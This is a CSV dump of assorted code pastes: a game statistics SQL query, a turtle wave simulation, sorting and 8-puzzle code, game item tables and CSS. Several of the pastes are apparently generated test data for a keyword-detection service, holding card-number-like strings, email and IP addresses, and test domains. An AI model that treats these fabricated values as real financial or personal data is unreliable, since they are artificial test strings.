id,title,username,language,date,content
0JAKtbdd,Untitled,slnt,MySQL,Tuesday 16th of January 2024 04:25:01 AM CDT,"SELECT
    `all_data`.`year`,
    `all_data`.`month`,
    `all_data`.`sessions`,
    `all_data`.`playTime`,
    `all_data`.`events`,
    `all_data`.`alerts`,
    `all_data`.`alertedVehicles`,
    `all_data`.`statusUpdates`,
    `all_data`.`callRequests`,
    `all_data`.`hospitalAssignments`,
    `all_data`.`forceFinishedEvents`,
    `all_data`.`resetedVehicles`,
    COALESCE(`morticians_data`.`dead`, 0) + all_data.morticians AS `dead`,
    COALESCE(`towed_data`.`towed`, 0) + all_data.towed AS `towed`,
    `ranked_data`.`longestSessionId`,
    `ranked_data`.`longestSessionHost`,
    `ranked_data`.`longestSessionPlayTime`,
    `ranked_data`.`mostEventsSessionId`,
    `ranked_data`.`mostEventsSessionHost`,
    `ranked_data`.`mostEventsSessionCount`,
    `real_ranked_data`.`mostEventsSessionId` AS ""realMostEventsSessionId"",
    `real_ranked_data`.`mostEventsSessionHost` AS ""realMostEventsSessionHost"",
    `real_ranked_data`.`mostEventsSessionCount` ""realMostEventsSessionCount"",
    `startup_data`.`total_startups`,
    `pairs_data`.`mostPlayTimePlayer1`,
    `pairs_data`.`mostPlayTimePlayer2`,
    `pairs_data`.`mostPlayTime`,
    `pairs_data`.`mostSessionsPlayer1`,
    `pairs_data`.`mostSessionsPlayer2`,
    `pairs_data`.`mostSessions`
FROM
    (
        SELECT
            YEAR(`s`.`startTime`) AS `year`,
            MONTH(`s`.`startTime`) AS `month`,
            COUNT(0) AS `sessions`,
            ROUND(
                ((SUM(`s`.`playTime`) / 60) / 60),
                0
            ) AS `playTime`,
            SUM(`ss`.`events`) AS `events`,
            SUM(`ss`.`alerts`) AS `alerts`,
            SUM(`ss`.`alertedVehicles`) AS `alertedVehicles`,
            SUM(`ss`.`statusUpdates`) AS `statusUpdates`,
            SUM(`ss`.`callRequests`) AS `callRequests`,
            SUM(`ss`.`hospitalAssignments`) AS `hospitalAssignments`,
            SUM(`ss`.`forceFinishedEvents`) AS `forceFinishedEvents`,
            SUM(`ss`.`resetedVehicles`) AS `resetedVehicles`,
            SUM(`ss`.`morticians`) AS `morticians`,
            SUM(`ss`.`towcars`) AS `towed`
        FROM
            `luedenscheid`.`sessions` `s`
        JOIN `luedenscheid`.`session_statistics` `ss` ON `s`.`id` = `ss`.`sessionId`
        GROUP BY
            YEAR(`s`.`startTime`),
            MONTH(`s`.`startTime`)
    ) AS `all_data`
LEFT JOIN
    (
        SELECT
            YEAR(`s`.`startTime`) AS `year`,
            MONTH(`s`.`startTime`) AS `month`,
            SUM(`svs`.`status8`) AS `dead`
        FROM
            `luedenscheid`.`sessions` `s`
        JOIN `luedenscheid`.`session_vehicle_statistics` `svs` ON `s`.`id` = `svs`.`sessionId`
        WHERE
            `svs`.`vehicleId` IN (1972, 1973, 1977)
        GROUP BY
            YEAR(`s`.`startTime`),
            MONTH(`s`.`startTime`)
    ) AS `morticians_data` ON `all_data`.`year` = `morticians_data`.`year` AND `all_data`.`month` = `morticians_data`.`month`
LEFT JOIN
    (
        SELECT
            YEAR(`s`.`startTime`) AS `year`,
            MONTH(`s`.`startTime`) AS `month`,
            SUM(`svs`.`status8`) AS `towed`
        FROM
            `luedenscheid`.`sessions` `s`
        JOIN `luedenscheid`.`session_vehicle_statistics` `svs` ON `s`.`id` = `svs`.`sessionId`
        WHERE
            `svs`.`vehicleId` IN (1967, 1968, 1969, 1970, 1971, 1974, 1975, 1976)
        GROUP BY
            YEAR(`s`.`startTime`),
            MONTH(`s`.`startTime`)
    ) AS `towed_data` ON `all_data`.`year` = `towed_data`.`year` AND `all_data`.`month` = `towed_data`.`month`
LEFT JOIN 
    (
        WITH RankedSessions AS (
            SELECT
                `s`.`id` AS `sessionId`,
                YEAR(`s`.`startTime`) AS `year`,
                MONTH(`s`.`startTime`) AS `month`,
                s.name as host,
                `s`.`playTime`,
                `ss`.`events`,
                ROW_NUMBER() OVER (PARTITION BY YEAR(`s`.`startTime`), MONTH(`s`.`startTime`) ORDER BY `s`.`playTime` DESC) AS PlayTimeRank,
                ROW_NUMBER() OVER (PARTITION BY YEAR(`s`.`startTime`), MONTH(`s`.`startTime`) ORDER BY `ss`.`events` DESC) AS EventsRank
            FROM
                `luedenscheid`.`sessions` `s`
            JOIN
                `luedenscheid`.`session_statistics` `ss` ON `s`.`id` = `ss`.`sessionId`
        )
        SELECT
            `year`,
            `month`,
            MAX(CASE WHEN PlayTimeRank = 1 THEN `sessionId` END) AS `longestSessionId`,
            MAX(CASE WHEN PlayTimeRank = 1 THEN `host` END) AS `longestSessionHost`,
            MAX(CASE WHEN PlayTimeRank = 1 THEN `playTime` END) AS `longestSessionPlayTime`,
            MAX(CASE WHEN EventsRank = 1 THEN `sessionId` END) AS `mostEventsSessionId`,
            MAX(CASE WHEN EventsRank = 1 THEN `host` END) AS `mostEventsSessionHost`,
            MAX(CASE WHEN EventsRank = 1 THEN `events` END) AS `mostEventsSessionCount`
        FROM
            RankedSessions
        GROUP BY
            `year`, `month`
    ) AS `ranked_data` ON `all_data`.`year` = `ranked_data`.`year` AND `all_data`.`month` = `ranked_data`.`month`
LEFT JOIN 
    (
        WITH RankedSessions AS (
            SELECT
                `s`.`id` AS `sessionId`,
                YEAR(`s`.`startTime`) AS `year`,
                MONTH(`s`.`startTime`) AS `month`,
                s.name as host,
                `s`.`playTime`,
                `ss`.`events`,
                ROW_NUMBER() OVER (PARTITION BY YEAR(`s`.`startTime`), MONTH(`s`.`startTime`) ORDER BY `ss`.`events` DESC) AS EventsRank
            FROM
                `luedenscheid`.`sessions` `s`
            JOIN
                `luedenscheid`.`session_statistics` `ss` ON `s`.`id` = `ss`.`sessionId`
            WHERE (`ss`.`events` <> 0)
            AND (((`ss`.`alerts` / `ss`.`events`) * 100 ) > 80)
            AND (`ss`.`alerts` > 10)
            AND (((`ss`.`forceFinishedEvents` / `ss`.`events`) * 100) < 20)
            AND (((`ss`.`lstGeneratedEvents` / `ss`.`events`) * 100) < 20)
        )
        SELECT
            `year`,
            `month`,
            MAX(CASE WHEN EventsRank = 1 THEN `sessionId` END) AS `mostEventsSessionId`,
            MAX(CASE WHEN EventsRank = 1 THEN `host` END) AS `mostEventsSessionHost`,
            MAX(CASE WHEN EventsRank = 1 THEN `events` END) AS `mostEventsSessionCount`
        FROM
            RankedSessions
        GROUP BY
            `year`, `month`
    ) AS `real_ranked_data` ON `all_data`.`year` = `real_ranked_data`.`year` AND `all_data`.`month` = `real_ranked_data`.`month`
LEFT JOIN
    (
        SELECT
            YEAR(`ps`.`time`) AS `year`,
            MONTH(`ps`.`time`) AS `month`,
            COUNT(0) AS `total_startups`
        FROM
            `luedenscheid`.`player_startups` `ps`
        GROUP BY
            `year`, `month`
    ) AS `startup_data` ON `all_data`.`year` = `startup_data`.`year` AND `all_data`.`month` = `startup_data`.`month`
LEFT JOIN
    (
        WITH RankedPairsPlayTime AS (
            SELECT
                `year`,
                `month`,
                `player1`,
                `player2`,
                `total_playtime`,
                `total_sessions`,
                ROW_NUMBER() OVER (PARTITION BY `year`, `month` ORDER BY `total_playtime` DESC) AS RowNum
            FROM
                `view_player_pairing_monthly`
        ),
        RankedPairsSessions AS (
            SELECT
                `year`,
                `month`,
                `player1`,
                `player2`,
                `total_playtime`,
                `total_sessions`,
                ROW_NUMBER() OVER (PARTITION BY `year`, `month` ORDER BY `total_sessions` DESC) AS RowNum
            FROM
                `view_player_pairing_monthly`
        )
    SELECT
        p1.`year`,
        p1.`month`,
        p1.`player1` AS `mostPlayTimePlayer1`,
        p1.`player2` AS `mostPlayTimePlayer2`,
        p1.`total_playtime` AS `mostPlayTime`,
        s1.`player1` AS `mostSessionsPlayer1`,
        s1.`player2` AS `mostSessionsPlayer2`,
        s1.`total_sessions` AS `mostSessions`
    FROM
        RankedPairsPlayTime p1
    JOIN
        RankedPairsSessions s1
    ON
        p1.`year` = s1.`year` AND p1.`month` = s1.`month` AND p1.RowNum = 1 AND s1.RowNum = 1
    ) AS `pairs_data` ON `all_data`.`year` = `pairs_data`.`year` AND `all_data`.`month` = `pairs_data`.`month`
ORDER BY
    `all_data`.`year` DESC,
    `all_data`.`month` DESC;
"
ADQzZFme,Turtle Wave Gen,KillerRebooted,Python,Tuesday 16th of January 2024 04:23:21 AM CDT,"from turtle import *
import random, math, time, os

win = Screen()
win.title(os.path.basename(__file__)[:-3])
win.tracer(0)

def wave_function(boundary_size, longitudinal, particle_amount, wave_type, A, T, lam):

    boundary_creator = Turtle()
    boundary_creator.ht()
    boundary_creator.pensize(4)
    boundary_creator.pu()

    if longitudinal:

        width = 2*boundary_size + 2*A
        height = boundary_size/2

    else:

        width = 2*boundary_size
        height = 5*A

    boundary_creator.setx(-width/2)
    boundary_creator.sety(height/2)

    boundary_creator.pd()

    for i in range(2):
        boundary_creator.fd(width)
        boundary_creator.right(90)
        boundary_creator.fd(height)
        boundary_creator.right(90)

    particle_tracer = Turtle()
    particle_tracer.seth(90)
    particle_tracer.color(""red"")
    particle_tracer.pu()

    particles = []
    for i in range(particle_amount):
        particle = Turtle(""circle"")
        particle.shapesize(.3, .3)
        particle.pu()
        
        if longitudinal:
            particle.setpos(random.randint(-boundary_size, boundary_size), random.randint(int(-height//2), int(height//2)) )
        else:
            particle.setx(-boundary_size + (boundary_size/particle_amount)*2*i)

        particles.append(particle)

    og_coords = [particle.pos() for particle in particles]

    start = time.time()

    chosen_one = random.randint(0, particle_amount-1)

    particles[chosen_one].color(""red"")
    particles[chosen_one].shapesize(.4, .4)
    particle_tracer.setx(particles[chosen_one].xcor())

    def make_wave(wave_type, A, T, lam):

        t = time.time()-start

        for particle in particles:

            x = particle.xcor()+width/2

            if wave_type == ""progressive"": y = ""A*math.sin( ((2*math.pi)/T)*t - ((2*math.pi)/lam)*x)""
            elif wave_type == ""standing"": y = ""A*math.sin(((2*math.pi)/lam)*x)*math.cos(((2*math.pi)/T)*t)""

            if longitudinal:
                particle.setx(og_coords[particles.index(particle)][0] + eval(y))
            else:
                particle.sety(eval(y))

        particle_tracer.setpos(particles[chosen_one].xcor(), particles[chosen_one].ycor() - 20)

        win.update()

    win.listen()
    win.onkeypress(win.bye, ""Escape"")

    while True:
        make_wave(wave_type, A, T, lam)

if __name__ == ""__main__"":
    wave_function(boundary_size=500, longitudinal=True, particle_amount=500, wave_type=""standing"", A=30, T=4, lam=100)"
TLf1iBnt,Класиране на приема,Maina55,C#,Tuesday 16th of January 2024 04:11:42 AM CDT,"internal class Program
{
    private static void Main(string[] args)
    {
        int[] nums = Console.ReadLine().Split().Select(int.Parse).ToArray();
        //BubbleSort(nums);
        //SelectionSort(nums);
        InsertionSort(nums);
        Console.WriteLine(String.Join("" "", nums));
    }


    public static void BubbleSort(int[] nums)
    {
        int n = nums.Length;

        for (int i = 0; i < n; i++)
        {
            for (int j = 0; j < n - 1; j++)
            {
                if (nums[j] < nums[j + 1])
                {
                    int tempnum = nums[j];
                    nums[j] = nums[j + 1];
                    nums[j + 1] = tempnum;
                }
            }
        }

    }


    public static void SelectionSort(int[] nums)
    {


        int n = nums.Length;
        for (int i = 0; i < n - 1; i++)
        {
            int smallestnum = i;
            for (int j = i + 1; j < n; j++)
            {
                if (nums[j] > nums[smallestnum])
                {
                    smallestnum = j;
                }
            }

            int curnum = nums[smallestnum];
            nums[smallestnum] = nums[i];
            nums[i] = curnum;
        }
    }


    public static void InsertionSort(int[] nums)
    {
        int n = nums.Length;
        for (int i = 1; i < n; i++)
        {
            int key = nums[i];
            int j = i - 1;

            while (j >= 0 && nums[j] < key)
            {
                nums[j + 1] = nums[j];
                j = j - 1;
            }

            nums[j + 1] = key;
        }
    }
   
}

"
sA1GZKVh,Untitled,poxipox,Lua,Tuesday 16th of January 2024 04:06:38 AM CDT,"	https://i.imgur.com/oZ94Nya.png OLD << ustawiania

system jest kompletnie zmieniony (silnikowo wiec tam chuj, ale chodzi o to ze teraz mozesz zupgradowac wszystko (procz setow typu ace set co musisz ubierac w calosci) 

- atack na bronie : mozesz ladowac tylko w 3 sloty 1/2/3 (sztywno do broni) i 3 inne jak nizej (cryt/fury lucky/atack speed/ - wiadomo cza ustawic ograniczenie zeby bronie nie dawaly %hp tylko to zostawic juz na eq) 

tak to wyglada: https://i.imgur.com/bM39rug.png (na ss te same wyglady upgradeow na testey bylo)

upgrady sie stakuja - np masz w przedmiocie 6x  Max Health i ten przedmiot ma juz w sobie Max Health to dodaje, tak samo z bronią np % chance +DMG

ogolnie sloty mozesz czyscic (jak widzisz na ss jest x) - z tym ze bron jak czysicc attack to czysci slot 1/2/3 (gdzie mozesz dac tylko attack upg) 


* POTARY: bedzie specialny UPG gem ktory daje 1 LOSOWy atrubyt (takich mozesz naladowac 6 na itemw ogolnie w item kazdy)
- z tym ze tu mozesz wyczyscic ostatni dodany slot max 10 sec od dodania (nie ma potem opcji konfiguracji) 


[ATTR_ITEM_PERC_HP] = {text = '% max HP', refresh = 1},
	[ATTR_ITEM_PERC_KI] = {text = '% max Ki', refresh = 1},
	[ATTR_ITEM_MAX_HP] = {text = 'Max Health', refresh = 1},
	[ATTR_ITEM_MAX_KI] = {text = 'Max Ki', refresh = 1},
	[ATTR_ITEM_GAINS_KI] = {text = 'Ki Regen', refresh = 3},
	[ATTR_ITEM_GAINS_HP] = {text = 'HP Regen', refresh = 3},
	[ATTR_ITEM_GAINS_PERC_KI] = {text = '% Ki Regen', refresh = 3},
	[ATTR_ITEM_GAINS_PERC_HP] = {text = '% HP Regen', refresh = 3},
	-- [8] = {ATTR_ITEM_unsles, 'ATTR_ITEM_unsles'},

	[ATTR_ITEM_SOUL] = {text = 'Max power', refresh = 1},
	[ATTR_ITEM_CRIT] = {text = 'Critical'},
	[ATTR_ITEM_CRIT_SPELL] = {text = 'Critical Spell'},

	[ATTR_ITEM_ATTACK] = {text = 'Attack'},
	-- [13] = {ATTR_ITEM_unsles, 'ATTR_ITEM_unsles'},
	[ATTR_ITEM_ARMOR] = {text = 'Mele Protect'},

	[ATTR_ITEM_F_LUCKY] = {text = 'Fury Lucky'},
	[ATTR_ITEM_A_SPEED] = {text = 'Attack Speed'},
	[ATTR_ITEM_BARRIER] = {text = 'Ki Barrier', refresh = 1},

	[ATTR_ITEM_DMG_PER_CHANCE] = {text = '% chance to weapon DMG'}, -- te 2 w calosci jedeny upgrade np 100%: 5% chance to +5% dmg
	[ATTR_ITEM_DMG_PER] = {text = '% weapon DMG'},

	[ATTR_ITEM_PROTECT_ALL] = {text = 'Protect ALL', refresh = 1},
	[ATTR_ITEM_PROTECT_PVP] = {text = 'Protect PvP', refresh = 1},
	[ATTR_ITEM_PROTECT_PVM] = {text = 'Protect PvM', refresh = 1},

	[ATTR_ITEM_DMG_ALL] = {text = 'DMG ALL', refresh = 1},
	[ATTR_ITEM_DMG_PVP] = {text = 'DMG PvP', refresh = 1},
	[ATTR_ITEM_DMG_PVM] = {text = 'DMG PvM', refresh = 1},
	[ATTR_ITEM_DODGE_PVM] = {text = 'Dodge vM', refresh = 1},"
YaA7FZQG,Untitled,poxipox,Lua,Tuesday 16th of January 2024 04:04:46 AM CDT,"1, 'PACC 31 Day (Scroll)', 'PACC For 31 Day Scroll', 10, 
4, 'Pacc 3 Day', 'Pacc 3 Day to Your account!', 2, 
2, 'Pacc 21 Day', 'Pacc 21 Day to Your account!', 7, 
3, 'Pacc 7 Day', 'Pacc 7 Day to Your account!', 4, 
5, '200 Senzu', '200 Senzu in Bp', 1, 
6, '200 Golds', '200 Golds (money) in Bp', 1, 
7, 'Box digital card of GOD', 'This box add 1-3 Special digital card (RANDOM!), it allows to change the outfit of God Transform.', 3
8, 'God Essence BOX', 'God Essence BOX <br> - Random:  5-20x God Essence', 3, 
9, 'Ultra Essence box', 'Ultra Essence BOX <br>- Random: 5-20x Ultra Essence ', 4,
10, 'Stamina recovery', 'Add +12h stamina! (max use 3x on 24h!)', 7, 
11, 'Remove 7 Days ban', 'Remove 7 days bans from players.<br>-warning.', 20
12, 'Account AutoLoot', 'Upgrade FREE AutoLoot<br>+)', 5,
13, 'Account AutoLoot (Item)', '', 5
14, 'Skip mission +51', 'Jumps to the 51st mission (!mission)\r\n- Receive items and exp from these missions', 20
15, '[Bonus] ReFill', 'Item which can be re-charged (renew) with Bonus Ki/HP/Power Recovery (1 use and remove)', 3, 
16, 'Starter Box', 'Pack Item for start:\r\n+ 50x Gold\r\n+ 50x Senzu\r\n+ 1x Starter backpack (+100/s HP/KI + Light) + 1x Starter Band200 HP/KI(3h work) \r\n+ 1x BOL\r\n+ 1x Distance Weapon (ki blast etc) \r\n+ 1x Gift?\r\n', 10, 
17, 'Victory Premium', '+ duration 30 days )\r\n+ 40% reduced exh on !mission/!sag/!ssag\r\n+ 5% Master Exp\r\n+ House Train - item to unique (only for the duration of VP)\r\n+ 15/5 slot to account/free autoloot\r\n+ 2 min UI time work', 20
18, '[RANDOM] Profession Change Papers', 'This item add 3x (RANDOM) Papers of [profession/Universal] to alter your Profesion | You must have 10x the same for a particular profession.', 50
19, '10x Paper of [Universal]', 'Special Papers, with these 10x pieces you can change professions to any one you like!', 300"
PegxRTxM,JKIT || JKit Post Block - Full Width Thumbnail,fauzanjeg,CSS,Tuesday 16th of January 2024 04:04:05 AM CDT,"/**	JKit Post Block - Full Width Thumbnail */
.elementor-element-b4decbf .jeg-elementor-kit.jkit-postblock .jkit-post .jkit-thumb .thumbnail-container {
	height: unset;
}

.elementor-element-b4decbf .jeg-elementor-kit.jkit-postblock .jkit-post .jkit-thumb .thumbnail-container img {
	width: 100%;
	height: 100%;
	position: relative;
	top: unset;
	left: unset;
	transform: unset;
}"
tV0uVFNZ,Assignment 2,Alphaviper,Python,Tuesday 16th of January 2024 03:41:49 AM CDT,"import heapq

class PuzzleNode:
    def __init__(self, state, parent=None, move=None, cost=0):
        self.state = state
        self.parent = parent
        self.move = move
        self.cost = cost
        self.heuristic = self.calculate_heuristic()

    def calculate_heuristic(self):
        heuristic = 0
        for i in range(3):
            for j in range(3):
                if self.state[i][j] != 0:
                    goal_row, goal_col = divmod(self.state[i][j] - 1, 3)
                    heuristic += abs(i - goal_row) + abs(j - goal_col)
        return heuristic


    def __lt__(self, other):
        return (self.cost + self.heuristic) < (other.cost + other.heuristic)

def solve_8_puzzle(initial_state):
    goal_state = [[1, 2, 3], [4, 5, 6], [7, 8, 0]]
    initial_node = PuzzleNode(initial_state)
    priority_queue = [initial_node]

    while priority_queue:
        current_node = heapq.heappop(priority_queue)

        if current_node.state == goal_state:
            # Goal state reached, reconstruct the path
            path = []
            while current_node.parent:
                path.append((current_node.move, current_node.state))
                current_node = current_node.parent
            path.reverse()
            return path

        # Generate and enqueue successor nodes
        successors = generate_successors(current_node)
        for successor, move in successors:
            heapq.heappush(priority_queue, successor)

    return None  # No solution found

def generate_successors(node):
    successors = []
    zero_row, zero_col = find_zero_position(node.state)

    # Define possible moves: 'U', 'D', 'L', 'R' for up, down, left, right
    moves = [(-1, 0, 'U'), (1, 0, 'D'), (0, -1, 'L'), (0, 1, 'R')]

    for dr, dc, move in moves:
        new_row, new_col = zero_row + dr, zero_col + dc

        if 0 <= new_row < 3 and 0 <= new_col < 3:
            new_state = [row.copy() for row in node.state]
            new_state[zero_row][zero_col], new_state[new_row][new_col] = new_state[new_row][new_col], 0
            successors.append((PuzzleNode(new_state, node, move, node.cost + 1), move))

    return successors

def find_zero_position(state):
    for i in range(3):
        for j in range(3):
            if state[i][j] == 0:
                return i, j

# Example usage:
initial_state = [[1, 2, 3], [0, 4, 6], [7, 5, 8]]
solution_path = solve_8_puzzle(initial_state)
print(solution_path)
"
QfuQ97jU,Advanced AND - Donald AND Duck AND Hello,wheresTheAnyKey,C,Tuesday 16th of January 2024 03:25:03 AM CDT,"Pasted at: 16/01/2024 09:25
Test data generated by 98823c9ce7f73d22c0e84a43ab6f6ed3

DATA_ID_TESTDATATOFIND
hello, donald was a duck

5502491997132108

Fuzzy-Wuzzy	- DASH
Fuzzy;Wuzzy	- COLON
Fuzzy!Wuzzy	- EXCLAMATION
Fuzzy£Wuzzy	- POUND
Fuzzy#Wuzzy	- HASH
Fuzzy%Wuzzy	- PERCENT
Fuzzy@Wuzzy	- AT
Fuzzy&Wuzzy	- AND
Fuzzy=Wuzzy	- EQUAL
Fuzzy§Wuzzy
Fuzzy~Wuzzy
Fuzzy?Wuzzy	 - QUESTION MARK
Fuzzy$Wuzzy	 - DOLLAR
Fuzzy[Wuzzy] - BRACKETS
Fuzzy^Wuzzy
Fuzzy(Wuzzy) - BRACKETS
Fuzzy+Wuzzy	 - PLUS
Fuzzy±Wuzzy	 - PLUS/MINUE
Fuzzy|Wuzzy	 - PIPE
Fuzzy/Wuzzy	 - FORWARDSLASH
Fuzzy<Wuzzy> - BRACKETS
Fuzzy{Wuzzy} - CURLY
Fuzzy\Wuzzy  - BACKSLASH
"
8spjahLy,Financial What's Inside - Email/IP/Bank,wheresTheAnyKey,C,Tuesday 16th of January 2024 03:25:01 AM CDT,"Pasted at: 16/01/2024 09:25
Test data generated by 98823c9ce7f73d22c0e84a43ab6f6ed3
What's Inside Paste 

5378496492418234
5571598708435236
5587663820997281
5502491997132108
5516931903918995
5322909948799236
5443317136071703
5409137465238695
5497550044220575
5559606180091553

aaribaud@att.net
aaribaud@comcast.net
aaribaud@att.com
aaribaud@att.co.uk
aaribaud@yahoo.com

246.107.72.199
221.187.199.189
3.109.3.44
109.112.85.139
250.83.213.179
169.141.201.234
50.180.50.59
20.181.54.231
64.235.191.167
48.103.36.43"
Fwm1DDyb,Financial with SPECIAL CHARACTERS,wheresTheAnyKey,C,Tuesday 16th of January 2024 03:24:59 AM CDT,"Pasted at: 16/01/2024 09:24
Test data generated by 98823c9ce7f73d22c0e84a43ab6f6ed3

DATA_ID_TESTDATATOFIND

5148-2121-6312-7114   - DASHES
5148212163127114
5107-4578-0576-9075   - DASHES
5107457805769075
3488-1760-1454-729   - DASHES
348817601454729

Fuzzy-Wuzzy	- DASH
Fuzzy;Wuzzy	- COLON
Fuzzy!Wuzzy	- EXCLAMATION
Fuzzy£Wuzzy	- POUND
Fuzzy#Wuzzy	- HASH
Fuzzy%Wuzzy	- PERCENT
Fuzzy@Wuzzy	- AT
Fuzzy&Wuzzy	- AND
Fuzzy=Wuzzy	- EQUAL
Fuzzy§Wuzzy
Fuzzy~Wuzzy
Fuzzy?Wuzzy	 - QUESTION MARK
Fuzzy$Wuzzy	 - DOLLAR
Fuzzy[Wuzzy] - BRACKETS
Fuzzy^Wuzzy
Fuzzy(Wuzzy) - BRACKETS
Fuzzy+Wuzzy	 - PLUS
Fuzzy±Wuzzy	 - PLUS/MINUE
Fuzzy|Wuzzy	 - PIPE
Fuzzy/Wuzzy	 - FORWARDSLASH
Fuzzy<Wuzzy> - BRACKETS
Fuzzy{Wuzzy} - CURLY
Fuzzy\Wuzzy  - BACKSLASH"
XQfjiZ98,Domains with SPECIAL CHARS,wheresTheAnyKey,C,Tuesday 16th of January 2024 03:24:58 AM CDT,"Pasted at: 16/01/2024 09:24
Test data generated by 98823c9ce7f73d22c0e84a43ab6f6ed3

DATA_ID_TESTDATATOFIND

www.qatesting.com
blog.qatesting.com
www.qatesting.com/index.html
www.qatesting.com/home
www.qatestingblog.com
www.qatestingtutorials.com
shop.qatesting.co.uk
admin.qatesting.io 
qatesting
qatesting.co.uk
qatesting.cn
qatesting.io
findmetesting.com
www.qatesting-blog.com
www.qatesting-blog23.com
www.qatesting
www.qatesting.co.uk
www.qatesting.cn
www.qatesting.io
www.findmetesting.com
www.wobsut.gov

The difference is that QA is process oriented and QC is product oriented.

Testing, therefore is product oriented and thus is in the QC domain. Testing for quality isn't assuring quality, it's controlling it.



Fuzzy-Wuzzy	- DASH
Fuzzy;Wuzzy	- COLON
Fuzzy!Wuzzy	- EXCLAMATION
Fuzzy£Wuzzy	- POUND
Fuzzy#Wuzzy	- HASH
Fuzzy%Wuzzy	- PERCENT
Fuzzy@Wuzzy	- AT
Fuzzy&Wuzzy	- AND
Fuzzy=Wuzzy	- EQUAL
Fuzzy§Wuzzy
Fuzzy~Wuzzy
Fuzzy?Wuzzy	 - QUESTION MARK
Fuzzy$Wuzzy	 - DOLLAR
Fuzzy[Wuzzy] - BRACKETS
Fuzzy^Wuzzy
Fuzzy(Wuzzy) - BRACKETS
Fuzzy+Wuzzy	 - PLUS
Fuzzy±Wuzzy	 - PLUS/MINUE
Fuzzy|Wuzzy	 - PIPE
Fuzzy/Wuzzy	 - FORWARDSLASH
Fuzzy<Wuzzy> - BRACKETS
Fuzzy{Wuzzy} - CURLY
Fuzzy\Wuzzy  - BACKSLASH
"
DrGVY7KL,ALL Keywords with Excluded Words,wheresTheAnyKey,C,Tuesday 16th of January 2024 03:24:56 AM CDT,"Pasted at: 16/01/2024 09:24
Test data generated by 98823c9ce7f73d22c0e84a43ab6f6ed3

DATA_ID_TESTDATATOFIND 

The dystopian version of superintelligence is illustrated with frequency by leaders in the technology industry, and is famously depicted by Hollywood in films like Terminator, 
or more recently Ex Machina, and even the Avengers. The “furious deity A.I.” is a story you know, because it is the story you are constantly told: we build the thinking machine, 
it surpasses our abilities in every way, and it destroys us for one of any number of reasons.Maybe it perceives us as a threat. Maybe we’re just in its way, 
and it hardly perceives us at all — mankind, a disposable insect race.

There are of course many arguments in opposition to the now ubiquitous concept of our apocalypse by artificial intelligence. 
I myself have called into question the logic of such dystopian arguments in Anatomy of Next. But our subject here is less pertaining to the nature of the conscious machine than 
it is to the way we talk about this subject, and what it means. First, consider that most of the artificial intelligence depicted in culture looks human, a representation with 
no basis in technological reality. Then, the true scope of the Singularity is almost impossible to predict, which begs a question: where are these opinions about the broadly 
unknowable coming from?"
FNU8gEZ7,All Keywords with ANY Additional Words,wheresTheAnyKey,C,Tuesday 16th of January 2024 03:24:55 AM CDT,"Pasted at: 16/01/2024 09:24
Test data generated by 98823c9ce7f73d22c0e84a43ab6f6ed3

DATA_ID_TESTDATATOFIND KEYWAUTO

The dystopian version of superintelligence is illustrated with frequency by leaders in the technology industry, and is famously depicted by Hollywood in films like Terminator, or more recently Ex Machina, and even the Avengers. The “angry god A.I.” is a story you know, because it is the story you are constantly told: we build the thinking machine, it surpasses our abilities in every way, and it destroys us for one of any number of reasons.
Maybe it perceives us as a threat. Maybe we’re just in its way, and it hardly perceives us at all — humanity, a disposable insect race.

There are of course many arguments in opposition to the now ubiquitous concept of our apocalypse by artificial intelligence. I myself have called into question the logic of such dystopian arguments in Anatomy of Next. But our subject here is less pertaining to the nature of the conscious machine than it is to the way we talk about this subject, and what it means. First, consider that most of the artificial intelligence depicted in culture looks human, a representation with no basis in technological reality. Then, the true scope of the Singularity is almost impossible to predict, which begs a question: where are these opinions about the broadly unknowable coming from?

6589745854123698

Fuzzy-Wuzzy	- DASH
Fuzzy;Wuzzy	- COLON
Fuzzy!Wuzzy	- EXCLAMATION
Fuzzy£Wuzzy	- POUND
Fuzzy#Wuzzy	- HASH
Fuzzy%Wuzzy	- PERCENT
Fuzzy@Wuzzy	- AT
Fuzzy&Wuzzy	- AND
Fuzzy=Wuzzy	- EQUAL
Fuzzy§Wuzzy
Fuzzy~Wuzzy
Fuzzy?Wuzzy	 - QUESTION MARK
Fuzzy$Wuzzy	 - DOLLAR
Fuzzy[Wuzzy] - BRACKETS
Fuzzy^Wuzzy
Fuzzy(Wuzzy) - BRACKETS
Fuzzy+Wuzzy	 - PLUS
Fuzzy±Wuzzy	 - PLUS/MINUE
Fuzzy|Wuzzy	 - PIPE
Fuzzy/Wuzzy	 - FORWARDSLASH
Fuzzy<Wuzzy> - BRACKETS
Fuzzy{Wuzzy} - CURLY
Fuzzy\Wuzzy  - BACKSLASH
"
